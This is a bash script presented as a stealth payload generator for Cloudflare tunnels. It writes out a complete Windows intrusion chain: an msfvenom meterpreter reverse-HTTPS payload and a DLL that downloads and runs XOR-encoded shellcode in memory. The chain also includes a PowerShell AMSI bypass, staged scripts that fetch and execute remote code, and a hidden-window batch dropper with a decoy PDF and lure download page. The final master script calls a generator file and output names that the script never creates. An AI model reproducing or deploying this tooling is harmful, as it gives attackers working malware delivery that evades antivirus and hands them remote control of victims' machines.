#!/bin/bash
# pgen.sh - Stealth Payload Generator for Cloudflare Tunnels
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u http://your-web-server.com [-v]

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Default values
TUNNEL_HOST=""
WEB_URL=""
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
OUTPUT_DIR="./generated"
VISIBLE_MODE=0

show_banner() {
    echo -e "${BLUE}"
    echo '╔══════════════════════════════════════════════════════════════════╗'
    echo '║     🚀 STEALTH PAYLOAD GENERATOR - CLOUDFLARE EDITION            ║'
    echo '║                    With Fixed PowerShell Syntax                  ║'
    echo '╚══════════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
}

show_usage() {
    echo -e "${YELLOW}Usage:${NC} $0 -t <tunnel_hostname> -u <web_url> [options]"
    echo
    echo "Required:"
    echo "  -t, --tunnel HOSTNAME    Your Cloudflare tunnel hostname"
    echo "  -u, --url WEB_URL         Your web server URL"
    echo
    echo "Options:"
    echo "  -p, --port PORT           Port for payload (default: 443)"
    echo "  -k, --key HEX_KEY         XOR key (default: 0x6A)"
    echo "  -o, --output DIR          Output directory (default: ./generated)"
    echo "  -v, --visible             Show console windows (debug mode)"
    echo "  -h, --help                Show this help"
    exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option $1${NC}"; show_usage ;;
    esac
done

if [ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ]; then
    echo -e "${RED}Error: Tunnel and URL are required${NC}"
    show_usage
fi

WEB_URL="${WEB_URL%/}"
XOR_KEY_DEC=$((XOR_KEY))

show_banner
echo -e "${GREEN}[✓] Configuration:${NC}"
echo "    Tunnel: $TUNNEL_HOST"
echo "    Web URL: $WEB_URL"
echo "    Port:    $PAYLOAD_PORT"
echo "    XOR Key: $XOR_KEY ($XOR_KEY_DEC)"
echo "    Mode:    $([ $VISIBLE_MODE -eq 1 ] && echo "VISIBLE" || echo "STEALTH")"
echo

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
cd "$OUTPUT_DIR" || exit 1

# ============================================
# STEP 1: Create payload generator (msfvenom IP workaround)
# ============================================
echo -e "${YELLOW}[1/6] Creating payload generator (msfvenom)...${NC}"

cat > tools/generate_payload.sh << EOF
#!/bin/bash
# Auto-generated - uses msfvenom with IP workaround

# Resolve tunnel IP (optional - you can also hardcode it)
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
KEY="$XOR_KEY_DEC"

echo "[+] Resolving IP for \$TUNNEL..."
LHOST_IP=\$(dig +short \$TUNNEL | head -n1)
if [ -z "\$LHOST_IP" ]; then
    echo "[!] DNS resolution failed, using fallback IP"
    LHOST_IP="104.16.231.132"   # fallback – you can change this
fi

echo "[+] Generating raw shellcode with IP \$LHOST_IP..."
msfvenom -p windows/x64/meterpreter_reverse_https \\
    LHOST="\$LHOST_IP" \\
    LPORT="\$PORT" \\
    -f raw \\
    -o ../output/payload.raw

if [ -f ../output/payload.raw ]; then
    echo "[+] Payload generated successfully"
else
    echo "[✗] Payload generation failed"
    exit 1
fi
EOF

chmod +x tools/generate_payload.sh
# ============================================
# STEP 2: Create DLL template
# ============================================
echo -e "${YELLOW}[2/6] Creating DLL template...${NC}"

cat > tools/dll_template.c << EOF
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

const char* c2_host = "$TUNNEL_HOST";
int c2_port = $PAYLOAD_PORT;
const unsigned char xor_key = $XOR_KEY_DEC;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetConnectA(hInternet, c2_host, c2_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/payload.enc", NULL, NULL, NULL, 
                                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
                if (hRequest) {
                    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                        unsigned char buffer[524288];
                        DWORD bytesRead;
                        if (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                            unsigned char* decoded = VirtualAlloc(NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                            if (decoded) {
                                for(DWORD i = 0; i < bytesRead; i++) decoded[i] = buffer[i] ^ xor_key;
                                void (*shellcode)() = (void(*)())decoded;
                                shellcode();
                            }
                        }
                    }
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
    }
    return TRUE;
}
EOF

# ============================================
# STEP 3: Create PowerShell stages (FIXED SYNTAX)
# ============================================
echo -e "${YELLOW}[3/6] Creating PowerShell stages with FIXED syntax...${NC}"

# Stage 3 - Final payload loader
cat > payloads/stage3.ps1 << EOF
# Stage 3 - Final payload loader
# Tunnel: $TUNNEL_HOST
# Web URL: $WEB_URL

\$key = $XOR_KEY_DEC
\$webUrl = "$WEB_URL"

try {
    Write-Host "[Stage3] Downloading payload.enc..." -ForegroundColor Yellow
    \$wc = New-Object System.Net.WebClient
    \$enc = \$wc.DownloadData("\$webUrl/payload.enc")
    Write-Host "[Stage3] Downloaded \$(\$enc.Length) bytes" -ForegroundColor Green
    
    Write-Host "[Stage3] XOR decrypting..." -ForegroundColor Yellow
    \$dec = for(\$i=0; \$i -lt \$enc.Count; \$i++) { \$enc[\$i] -bxor \$key }
    
    Write-Host "[Stage3] Allocating memory and executing..." -ForegroundColor Yellow
    \$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(\$dec.Length)
    [System.Runtime.InteropServices.Marshal]::Copy(\$dec, 0, \$ptr, \$dec.Length)
    \$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(\$ptr, [Type]([Action]))
    \$delegate.Invoke()
} catch {
    Write-Host "[Stage3] ERROR: \$(\$_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter to exit"
}
EOF

# Stage 2 - AMSI bypass + stage3 downloader
cat > payloads/stage2.ps1 << EOF
# Stage 2 - AMSI Bypass and Stage3 loader
# Web URL: $WEB_URL

Write-Host "[Stage2] Starting..." -ForegroundColor Yellow

# AMSI bypass
Write-Host "[Stage2] Patching AMSI..." -ForegroundColor Yellow
\$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
\$field = \$amsi.GetField('amsiInitFailed', 'NonPublic,Static')
\$field.SetValue(\$null, \$true)
Write-Host "[Stage2] AMSI bypassed" -ForegroundColor Green

# Download and execute stage3
Write-Host "[Stage2] Downloading stage3.ps1..." -ForegroundColor Yellow
\$url = "$WEB_URL/payloads/stage3.ps1"
\$script = (New-Object Net.WebClient).DownloadString(\$url)
Write-Host "[Stage2] Downloaded \$(\$script.Length) bytes" -ForegroundColor Green
Write-Host "[Stage2] Executing stage3..." -ForegroundColor Yellow
Invoke-Expression \$script
EOF

# ============================================
# STEP 4: Create FIXED Stage1.bat (MOST IMPORTANT)
# ============================================
echo -e "${YELLOW}[4/6] Creating FIXED Stage1.bat with proper PowerShell syntax...${NC}"

if [ $VISIBLE_MODE -eq 1 ]; then
    # VISIBLE MODE - Shows windows
    cat > payloads/stage1.bat << 'EOF'
@echo off
title Stage1 Payload Loader
color 0A
echo ========================================
echo        STAGE1 PAYLOAD LOADER
echo ========================================
echo.
echo [!] This window will download and execute
echo     the next stage automatically.
echo.
echo [1] Downloading stage2.ps1...
echo     URL: WEBURL_PLACEHOLDER/payloads/stage2.ps1
echo.

powershell.exe -NoP -NonI -Exec Bypass -Command "
Write-Host '[PowerShell] Starting stage2 download...' -ForegroundColor Yellow;
$webUrl = 'WEBURL_PLACEHOLDER';
try {
    Write-Host '[PowerShell] Downloading from: $webUrl/payloads/stage2.ps1' -ForegroundColor Yellow;
    $script = (New-Object Net.WebClient).DownloadString('WEBURL_PLACEHOLDER/payloads/stage2.ps1');
    Write-Host '[PowerShell] Download successful! Length: ' + $script.Length -ForegroundColor Green;
    Write-Host '[PowerShell] Executing stage2...' -ForegroundColor Yellow;
    Invoke-Expression $script;
} catch {
    Write-Host '[PowerShell] ERROR: ' -ForegroundColor Red;
    Write-Host $_.Exception.Message -ForegroundColor Red;
    Write-Host '';
    Write-Host 'Press any key to exit...' -ForegroundColor Cyan;
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
}
"

echo.
echo [2] Checking for decoy.pdf...
if exist decoy.pdf (
    echo [✓] Opening decoy.pdf...
    start decoy.pdf
) else (
    echo [✗] decoy.pdf not found - downloading...
    powershell -Command "(New-Object Net.WebClient).DownloadFile('WEBURL_PLACEHOLDER/decoy.pdf', 'decoy.pdf')"
    if exist decoy.pdf (
        echo [✓] Downloaded and opening...
        start decoy.pdf
    ) else (
        echo [✗] Failed to download decoy.pdf
    )
)

echo.
echo ========================================
echo Stage1 completed - Check PowerShell output above
echo ========================================
echo.
pause
EOF
else
    # STEALTH MODE - Hidden windows
    cat > payloads/stage1.bat << 'EOF'
@echo off
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "try {$script=(New-Object Net.WebClient).DownloadString('WEBURL_PLACEHOLDER/payloads/stage2.ps1'); Invoke-Expression $script} catch {}"
if exist decoy.pdf (start decoy.pdf) else (powershell -Command "(New-Object Net.WebClient).DownloadFile('WEBURL_PLACEHOLDER/decoy.pdf', 'decoy.pdf')" && start decoy.pdf)
EOF
fi

# Replace placeholders in stage1.bat
sed -i "s|WEBURL_PLACEHOLDER|$WEB_URL|g" payloads/stage1.bat

# ============================================
# STEP 5: Create XOR encryption utility
# ============================================
echo -e "${YELLOW}[5/6] Creating XOR encryption utility...${NC}"

cat > tools/xor_encrypt.py << EOF
#!/usr/bin/env python3
import sys

def xor_encrypt(input_file, output_file, key=$XOR_KEY_DEC):
    print(f"[*] XOR encrypting with key: {key} (0x{key:02X})")
    with open(input_file, 'rb') as f:
        data = f.read()
    encrypted = bytes([b ^ key for b in data])
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    print(f"[✓] Encrypted {len(data)} bytes -> {output_file}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: xor_encrypt.py <input_file> [output_file]")
        sys.exit(1)
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else input_file + ".enc"
    xor_encrypt(input_file, output_file)
EOF
chmod +x tools/xor_encrypt.py

# ============================================
# STEP 6: Create decoy.pdf and index.html
# ============================================
echo -e "${YELLOW}[6/6] Creating web files...${NC}"

echo "This document requires a viewer update. Please wait..." > decoy.pdf

cat > index.html << EOF
<!DOCTYPE html>
<html>
<head><title>Document Portal</title></head>
<body>
    <h1>📁 Document Portal</h1>
    <p>Tunnel: $TUNNEL_HOST</p>
    <p>Server: $WEB_URL</p>
    <p>Mode: $([ $VISIBLE_MODE -eq 1 ] && echo "Debug" || echo "Normal")</p>
    <ul>
        <li><a href="payloads/stage1.bat">Download stage1.bat</a></li>
        <li><a href="decoy.pdf">View Sample</a></li>
    </ul>
</body>
</html>
EOF

# ============================================
# STEP 7: Create master generator script
# ============================================
cat > generate_all.sh << EOF
#!/bin/bash
echo "[🚀] Generating all payloads..."
cd tools && ./generate_veil_payload.sh && cd ..
if [ -f output/cloudflare_payload.exe ]; then
    python3 tools/xor_encrypt.py output/cloudflare_payload.exe payload.enc
    x86_64-w64-mingw32-gcc -shared -o tools/loader.dll tools/dll_template.c -lwininet -s 2>/dev/null
    echo "[✓] All files generated successfully!"
    echo ""
    echo "Files to upload to your web server:"
    echo "  - payload.enc"
    echo "  - decoy.pdf"
    echo "  - payloads/stage1.bat"
    echo "  - payloads/stage2.ps1"
    echo "  - payloads/stage3.ps1"
    echo "  - index.html"
else
    echo "[✗] Payload generation failed"
fi
EOF
chmod +x generate_all.sh

# ============================================
# Final output
# ============================================
echo
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ GENERATION COMPLETE!${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo
echo -e "${BLUE}Files created in:${NC} $OUTPUT_DIR"
echo
echo -e "${YELLOW}Next steps:${NC}"
echo "1. cd $OUTPUT_DIR"
echo "2. ./generate_all.sh"
echo "3. Upload these files to your web server:"
echo "   - payload.enc"
echo "   - decoy.pdf"
echo "   - payloads/stage1.bat"
echo "   - payloads/stage2.ps1"
echo "   - payloads/stage3.ps1"
echo "   - index.html"
echo
echo -e "${YELLOW}From Windows VM download:${NC}"
echo -e "${GREEN}    $WEB_URL/payloads/stage1.bat${NC}"
echo
echo -e "${GREEN}Happy hacking! 🚀${NC}"
